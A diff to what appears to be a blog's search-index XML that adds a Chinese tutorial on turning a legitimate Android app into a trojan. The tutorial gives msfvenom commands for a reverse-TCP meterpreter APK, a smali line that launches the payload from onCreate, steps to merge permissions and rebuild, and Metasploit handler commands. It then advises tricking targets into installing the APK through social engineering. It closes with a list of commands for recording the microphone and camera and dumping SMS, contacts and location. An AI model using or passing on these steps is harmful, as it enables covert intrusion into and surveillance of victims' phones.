@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>手动给Android应用注入Payload</title>
+      <link href="/2019/02/25/%E6%89%8B%E5%8A%A8%E7%BB%99Android%E5%BA%94%E7%94%A8%E6%B3%A8%E5%85%A5Payload/"/>
+      <url>/2019/02/25/%E6%89%8B%E5%8A%A8%E7%BB%99Android%E5%BA%94%E7%94%A8%E6%B3%A8%E5%85%A5Payload/</url>
+      
+        <content type="html"><![CDATA[<p>###如何给Android应用写入木马</p><p>#####文章中介绍的工具、技术带有一定的攻击性，仅供安全研究，请合理合法使用。</p><p>####需要用到的工具：<br>    逆向工具：Android killer<br>    木马工具：Metasploit<br>5G时代的来临，让移动安全受到更大的热潮，而我刚好蹭下热点。现在大多数的安卓应用都可以轻易的使用一些反汇编软件能够轻松的对安卓应用进行植入木马病毒和恶意Payload。</p><p>####第一步：使用Metasploit生成需要的Payload<br><code>msf5 &gt; msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -o shell.apk</code><br><code>[*] exec: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -o shell.apk</code><br><code>[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload</code><br><code>[-] No arch selected, selecting arch: dalvik from the payload</code><br><code>No encoder or badchars specified, outputting raw payload</code><br><code>Payload size: 10090 bytes</code><br><code>Saved as: shell.apk</code></p><p>####第二步：反编译Android应用</p><p>#####使用反编译软件打开Android应用，我使用的是Android killer软件，其实在kali里面自带反编译软件的。<br><img src="https://p1.ssl.qhimg.com/t01a9f88e716f654bf2.png" alt=""></p><p>####第三步：寻找Android应用的入口文件和添加启动代码<br><img src="https://p0.ssl.qhimg.com/t01581fab3e300071cd.png" alt=""><br><img src="https://p5.ssl.qhimg.com/t017796c310b832d4af.png" alt=""><br>然后在onCreate函数里面添加Payload的启动文件<br><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V</code><br><img src="https://p0.ssl.qhimg.com/t01bb2e6785debf3c6d.png" alt=""></p><p>####第四步：添加Payload文件</p><p>#####使用反编译软件打开shell.apk，然后找到Metasploit文件<br><img src="https://p2.ssl.qhimg.com/t018cd8e7dc779f30a8.png" alt=""></p><p>#####然后把shell.apk下的Metasploit文件复制到需要植入Payload的apk里面的smali文件下的com的里面就可以了。<br><img src="https://p3.ssl.qhimg.com/t01c4c5c193b70fddf7.png" alt=""></p><p>####第五步：给Apk增加权限</p><p>#####打开shell.apk里面的AndroidManifest.xml，然后复制到需要植入Payload的apk里面的AndroidManifest.xml，需要注意的是权限的申请是唯一的，不能重复，不然可能会出现错误。<br><img src="https://p5.ssl.qhimg.com/t013a27e27ceca6b79e.png" alt=""></p><p>#####第六步：编译<br><img src="https://p3.ssl.qhimg.com/t015840998c58d4f624.png" alt=""></p><p>#####第七步：在Msf连接Payload<br><code>msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload</code><br><code>msf5 exploit(multi/handler) &gt; set LHOST 192.168.232.128</code><br><code>msf5 exploit(multi/handler) &gt; set LPORT 1111</code><br><code>msf5 exploit(multi/handler) &gt; exploit</code></p><p>#####第八步：利用社会工程学或者网马等技术让目标下载安装该APK，目标安装了该APK后我们就可以对目标的手机进行操作了。</p><p>######以下是Metasploit的一些Android Payload的命令<br>    webcam_list  列出网络摄像头<br>    record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒<br>    webcam_chat  开始视频聊天<br>    webcam_snap  从指定的摄像头获取快照<br>    webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]<br>    activity_start  从URI字符串启动Android活动<br>    check_root  检查设备是否有根<br>    dump_calllog  获取调用日志<br>    dump_contacts  获取联系人列表<br>    dump_sms  获取短信<br>    geolocate  利用地理定位获取当前LAT<br>    wlan_geolocate  利用WLAN信息获取当前LAT<br>    hide_app_icon  从发射器隐藏应用程序图标<br>    interval_collect  管理区间收集能力<br>    send_sms  从目标会话发送短消息<br>    set_audio_mode<br>    sqlite_query  从存储库查询SQLite数据库<br>    wakelock  启用/禁用Wakelock</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Android </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Metasploit常用的Payload</title>
       <link href="/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/"/>
       <url>/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/</url>
